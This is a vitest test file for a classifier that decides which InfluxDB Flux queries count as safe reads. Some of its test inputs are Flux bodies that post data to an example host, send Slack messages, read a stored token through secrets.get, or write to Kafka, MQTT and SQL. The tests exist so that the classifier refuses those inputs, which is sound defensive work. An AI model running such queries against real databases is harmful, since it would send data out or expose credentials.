import { describe, it, expect } from 'vitest';
import { assessQueryRead } from '../src/queryExecutionSafety.js';
import { validateQueryOptions } from '../src/queryValidation.js';

/* A live 2-page build against a connected InfluxDB instance (thread f4e3a7da) took 90+ minutes and
   169 MCP calls: every Flux read was refused with "Datasource kind influxdb has no proven read
   classifier", so each query had to be verified through a browser round trip instead. */
const influx = (options: Record<string, unknown>) =>
  assessQueryRead({ kind: 'influxdb', data_source_id: 'ds-1', options } as never);

const flux = (body: string) => influx({ operation: 'query_data', body });

describe('InfluxDB read classification', () => {
  it('proves a bounded Flux read', () => {
    const a = flux('from(bucket:"telemetry") |> range(start:-1h) |> limit(n:100)');
    expect(a.provenRead).toBe(true);
    expect(a.maxRows).toBe(100);
    expect(a.requiresCountPreflight).toBe(false);
    expect(a.source).toEqual({ kind: 'remote_endpoint', value: 'influxdb:telemetry' });
  });

  it('never marks a remote read directSafe', () => {
    const a = flux('from(bucket:"telemetry") |> range(start:-1h) |> limit(n:10)');
    expect(a.directSafe).toBe(false);
    expect(a.requiresRemoteReadConfirmation).toBe(true);
  });

  it('refuses to call an unlimited Flux query provably bounded', () => {
    const a = flux('from(bucket:"telemetry") |> range(start:-30d)');
    expect(a.provenRead).toBe(true);
    expect(a.requiresCountPreflight).toBe(true);
    expect(a.reason).toMatch(/no static limit/);
  });

  it('treats a limit above the threshold as needing a preflight', () => {
    const a = flux('from(bucket:"telemetry") |> range(start:-30d) |> limit(n:50000)');
    expect(a.requiresCountPreflight).toBe(true);
    expect(a.maxRows).toBe(50000);
  });

  it('refuses the whole Flux writer family, not just the two unqualified names', () => {
    /* query_data is a read by operation name only. The writers are package-qualified, and an earlier
       detector excluded a preceding dot to avoid matching user data — which let every qualified
       writer through. Flux records have no methods, so a qualified `.to(` is always a package call. */
    const writers = [
      'to(bucket:"b")',
      'experimental.to(bucket:"b")',
      'experimental.wideTo(bucket:"b")',
      'sql.to(driverName:"postgres", dataSourceName:"x", table:"t")',
      'kafka.to(brokers:["b:9092"], topic:"t")',
      'mqtt.to(broker:"tcp://b:1883")',
    ];
    for (const writer of writers) {
      const a = flux(`from(bucket:"a") |> range(start:-1h) |> ${writer}`);
      expect(a.provenRead, writer).toBe(false);
    }
  });

  it('refuses a body importing a package that can send data out or read secrets', () => {
    /* http.post/slack.message exfiltrate; secrets.get pulls credentials into the result. Each needs
       an explicit import, so gating on the import catches the call however it is aliased. */
    const egress = [
      ['http', 'http.post(url:"http://example.com", data:bytes(v:"x"))'],
      ['slack', 'slack.message(text:"x")'],
      ['influxdata/influxdb/secrets', 'secrets.get(key:"token")'],
    ];
    for (const [pkg, call] of egress) {
      const a = flux(`import "${pkg}"\nfrom(bucket:"a") |> range(start:-1h) |> ${call}`);
      expect(a.provenRead, pkg).toBe(false);
      expect(a.reason, pkg).toMatch(/send data out of InfluxDB or read secrets/);
    }
  });

  it('still allows a read that imports a harmless package', () => {
    /* The import gate must not refuse the helpers real read queries use. */
    expect(flux('import "date"\nfrom(bucket:"t") |> range(start:-1h) |> limit(n:5)').provenRead).toBe(true);
    expect(flux('import "influxdata/influxdb/schema"\nschema.fieldKeys(bucket:"t") |> limit(n:5)').provenRead).toBe(true);
  });

  it('does not mistake a column or function named *to* for a write', () => {
    expect(flux('from(bucket:"a") |> range(start:-1h) |> keep(columns:["into","_to"]) |> limit(n:5)').provenRead)
      .toBe(true);
  });

  it('proves metadata reads without executing a query', () => {
    expect(influx({ operation: 'list_buckets' }).provenRead).toBe(true);
    expect(influx({ operation: 'analyze_flux_query', body: '{}' }).provenRead).toBe(true);
  });

  it('refuses every operation that changes InfluxDB state', () => {
    for (const operation of ['write', 'create_bucket', 'update_bucket', 'delete_bucket']) {
      const a = influx({ operation, body: 'x' });
      expect(a.provenRead, operation).toBe(false);
      expect(a.reason, operation).toMatch(/not a read/);
    }
  });

  it('refuses a query_data with no Flux body to classify', () => {
    expect(influx({ operation: 'query_data', body: '   ' }).provenRead).toBe(false);
  });
});

describe('transformation configuration warnings', () => {
  const codes = (kind: string, options: Record<string, unknown>) =>
    validateQueryOptions(kind, options).warnings.map((w) => w.code);

  it('warns when transformation code is supplied but never enabled', () => {
    /* The reported failure: the transformation was saved and inert, so the table stayed empty and
       the defect read as a wrong transformation rather than a disabled one. */
    const c = codes('influxdb', {
      operation: 'query_data',
      body: 'from(bucket:"t") |> range(start:-1h) |> limit(n:10)',
      transformations: { javascript: 'return data;' },
    });
    expect(c).toContain('transformation_not_enabled');
    expect(c).toContain('transformation_language_missing');
  });

  it('stays quiet on a fully configured transformation', () => {
    const c = codes('influxdb', {
      operation: 'query_data',
      body: 'from(bucket:"t") |> range(start:-1h) |> limit(n:10)',
      transformations: { javascript: 'return data;' },
      enableTransformation: true,
      transformationLanguage: 'javascript',
    });
    expect(c).not.toContain('transformation_not_enabled');
    expect(c).not.toContain('transformation_language_missing');
    expect(c).not.toContain('influx_raw_csv_response');
  });

  it('flags code filed under a language the query does not run', () => {
    const c = codes('postgresql', {
      query: 'SELECT id FROM t LIMIT 1',
      transformations: { python: 'return data' },
      enableTransformation: true,
      transformationLanguage: 'javascript',
    });
    expect(c).toContain('transformation_language_mismatch');
  });

  it('says nothing about transformations when no code was supplied', () => {
    const c = codes('postgresql', { query: 'SELECT id FROM t LIMIT 1' });
    expect(c.some((code) => code.startsWith('transformation'))).toBe(false);
  });

  it('tells the author that Influx query_data returns raw CSV, not rows', () => {
    /* Reported: the MCP client inferred the transformation, the AI builder needed telling twice. */
    const c = codes('influxdb', {
      operation: 'query_data',
      body: 'from(bucket:"t") |> range(start:-1h) |> limit(n:10)',
    });
    expect(c).toContain('influx_raw_csv_response');
  });
});
